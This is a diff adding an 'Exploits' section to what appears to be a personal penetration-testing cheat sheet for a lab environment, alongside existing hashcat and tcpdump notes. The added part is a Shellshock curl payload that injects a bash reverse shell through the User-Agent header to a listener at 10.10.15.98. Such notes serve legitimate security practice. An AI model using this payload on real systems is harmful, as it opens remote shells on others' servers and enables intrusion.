@@ -80,3 +80,11 @@ hashcat -m 11600 -a 0 -o backup.cracked backup.hash /usr/share/wordlists/rockyou
 ### Test icmp
 
 `tcpdump -i tun0 icmp`
+
+## Exploits
+
+### Shellshock
+
+```
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/10.10.15.98/7777 0>&1 " http://10.10.10.56:80/cgi-bin/user.sh
+```
